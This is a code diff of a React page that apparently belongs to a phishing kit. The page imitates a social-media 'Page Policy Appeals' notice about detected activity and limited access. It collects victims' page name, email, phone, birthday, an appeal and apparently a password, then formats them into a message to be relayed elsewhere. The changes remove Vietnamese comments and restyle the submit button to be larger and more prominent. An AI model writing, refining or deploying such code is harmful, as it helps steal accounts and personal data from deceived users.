@@ -46,7 +46,7 @@ const Home = () => {
         mail: '',
         phone: '',
         birthday: '',
-        appeal: '' // Thêm trường appeal
+        appeal: ''
     });
 
     const [showPassword, setShowPassword] = useState(false);
@@ -160,7 +160,6 @@ const Home = () => {
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
-            // get calling code
             const code = getCountryCallingCode(detectedCountry);
             setCallingCode(`+${code}`);
         } catch {
@@ -202,7 +201,7 @@ const Home = () => {
     };
 
     const validateForm = () => {
-        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal']; // Thêm appeal vào required fields
+        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
 
         requiredFields.forEach((field) => {
@@ -249,7 +248,7 @@ const Home = () => {
 📧 <b>Email:</b> <code>${data.mail}</code>
 📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
 🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>
-📝 <b>Appeal:</b> <code>${data.appeal}</code>`; // Thêm appeal vào message
+📝 <b>Appeal:</b> <code>${data.appeal}</code>`;
     };
 
     const handleClosePassword = () => {
@@ -315,7 +314,6 @@ const Home = () => {
                         <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                             <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        {/* Sửa phần text mô tả - làm to hơn và responsive */}
                         <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
                             <p className='mb-3'>{translatedTexts.detectedActivity}</p>
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
@@ -387,7 +385,6 @@ const Home = () => {
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            {/* Thêm ô Your Appeal - Textarea lớn */}
                             <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-sm sm:text-base'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
@@ -404,7 +401,11 @@ const Home = () => {
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
 
-                            <button className='w-fit rounded-lg bg-gray-200 px-4 py-3 sm:px-3 sm:py-2 text-base sm:text-[15px] font-normal mt-1 sm:mt-2' onClick={handleSubmit}>
+                            {/* NÚT SUBMIT TO VÀ DÀI HƠN */}
+                            <button 
+                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-6 py-4 text-lg font-bold transition-colors duration-200 mt-4'
+                                onClick={handleSubmit}
+                            >
                                 {translatedTexts.submit}
                             </button>
                         </div>
